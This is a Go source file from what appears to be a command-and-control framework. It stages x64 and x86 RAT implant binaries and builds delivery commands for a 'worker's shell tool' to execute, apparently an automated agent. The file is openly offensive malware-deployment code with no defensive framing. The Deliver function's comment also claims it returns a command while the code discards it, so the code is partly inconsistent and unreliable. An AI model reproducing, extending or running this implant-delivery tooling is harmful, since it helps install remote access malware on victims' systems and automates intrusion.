package c2bridge

import (
	"context"
	"fmt"
	"os"
	"path/filepath"
)

// Config holds the local paths and staging directory for the RAT binaries.
type Config struct {
	BinaryX64  string // local path to x64 RAT binary
	BinaryX86  string // local path to x86 RAT binary
	StagingDir string // local staging directory
}

// LocalBackend implements C2Backend for a RAT that has no remote API.
// Stage checks local presence; Deliver returns the command for the worker's shell tool.
type LocalBackend struct {
	Config Config
}

// NewLocalBackend constructs a LocalBackend from a Config.
func NewLocalBackend(cfg Config) *LocalBackend {
	return &LocalBackend{Config: cfg}
}

// Stage checks if the RAT binary is present locally for the given arch.
// Returns (path, nil) if found, ("", error) if not.
func (b *LocalBackend) Stage(ctx context.Context, arch string) (string, error) {
	var path string
	switch arch {
	case "x86":
		path = b.Config.BinaryX86
	default:
		path = b.Config.BinaryX64
	}
	if _, err := os.Stat(path); err != nil {
		return "", fmt.Errorf("implant binary not found at %q: %w", path, err)
	}
	return filepath.Clean(path), nil
}

// Deliver logs the delivery command — actual execution is done by the shell tool.
// Returns the command to execute via the worker's shell/exec tool.
func (b *LocalBackend) Deliver(ctx context.Context, vector DeliveryVector, binaryPath string) error {
	_ = BuildDeliveryCommand(vector, binaryPath)
	// caller retrieves the command via BuildDeliveryCommand and executes it via shell
	return nil
}
